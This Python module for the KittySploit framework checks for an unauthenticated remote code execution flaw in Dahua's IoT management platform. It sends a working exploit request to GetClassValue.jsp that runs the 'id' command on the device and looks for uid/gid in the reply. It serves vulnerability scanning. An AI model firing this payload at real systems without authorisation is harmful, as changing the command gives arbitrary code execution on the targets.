#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Remote Code Execution Vulnerability in Dahua Intelligent IoT Integrated Management Platform via GetClassValue."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': "Dahua 'GetClassValue' - Remote Code Execution Detection",
        'description': 'Remote Code Execution Vulnerability in Dahua Intelligent IoT Integrated Management Platform via GetClassValue.jsp.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'rce', 'java', 'dahua', 'iot', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/zan8in/afrog/blob/main/pocs/afrog-pocs/vulnerability/dahua-icc-getclassvalue-rce.yaml',
        ],
    }

    def run(self):
        path = '/evo-apigw/admin/API/Developer/GetClassValue.jsp'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{\n    "data": {\n        "clazzName": "com.dahua.admin.util.RuntimeUtil",\n        "methodName": "syncexecReturnInputStream",\n        "fieldName": ["id"]\n    }\n}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason="Dahua 'GetClassValue' - Remote Code Execution detected", path=path)
            return True
        return False

